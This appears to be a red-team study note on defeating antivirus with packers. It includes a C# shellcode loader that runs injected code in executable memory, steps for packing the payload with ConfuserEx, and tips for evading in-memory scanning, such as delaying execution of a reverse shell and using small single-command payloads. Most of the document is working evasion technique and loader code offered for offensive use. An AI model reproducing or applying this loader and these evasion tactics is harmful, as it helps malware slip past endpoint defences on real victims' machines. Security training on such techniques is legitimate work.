### Introduction
---
This is one of the another way to defeat disk-based AV detection: It is a software that takes a program as input and transform it so the structure looks different while maintaining its function.

Why packers even exists?
- Compress the program so that it takes up less space.
- Protect the program from reverse engineering in general.

## Packers in Action
---
The packing function is responsible for transforming or obfuscating the original code that can be **reasonably** reversed by an **unpacking** function -- while sometimes packers may add some code (to make debugging the application harder as an example), it should able to get back the original code you wrote when executing it.

To unpack the original code, the packer embed a code stub (small piece of code) that contains an unpacker and redirect the main entry point of the executable to it.

- Though for example our malicious reverse shell is packed -- AV detection could still flag this if the **unpacker's code** has a known signature.
- If the Antivirus solution you are trying to bypass can do in-memory scans, it might still be detected afer your code is unpacked.
#### Packing C# with ConfuserEx
---
The code:

```C#
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    byte[] shellcode = new byte[] { !!REPLACE_MEEEEE!!! };


    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

The generated shellcode:

```C
csc UnEncStagelessPayload.cs
```

Uploading the following:

With ConfuserEx:

![Evading Antivirus - Shellcode-4.png|450](/img/user/cards/red-team/images/Evading%20Antivirus%20-%20Shellcode-4.png)

1. Move to **settings** and then select your payload (the `.exe`) file.
2. Click the **'+'** button to add settings (will show true)
3. Then for packer (same window) choose compressor
4. Edit the **'true'** rule by clicking the pencil icon:

Finally, go to **Protect** tab and hit **'Protect!'** then upload the following to the Antivirus:

Things to know and try against AV in memory scanning:

- **Just wait a bit** after 5 minutes since in-memory scanning is very resource expensive most AV will scan for a while after your process starts but will eventually stop.
	- Spawn a shell then wait for 5 minutes.
	- Do absolutely nothing (malicious) for 5 minutes then spawn a shell.
	- **Much better** is combine both delay the executon of the malicious payload then wait before doing anything suspicious over the reverse shell.
- **User smaller payloads** instead of using a **large, full-featured payload** (like a reverse shell or Meterpreter session), you can use a **very small payload** that executes **just one command**, why?
	- AV engines are more likely to detect large, complex payloads or at least flags it.
	- Small payloads that just **run a single command** are simpler, and often **donâ€™t contain obvious shellcode patterns**.
	- Basically less code = fewer suspicious indicators = less likely to trigger AV.
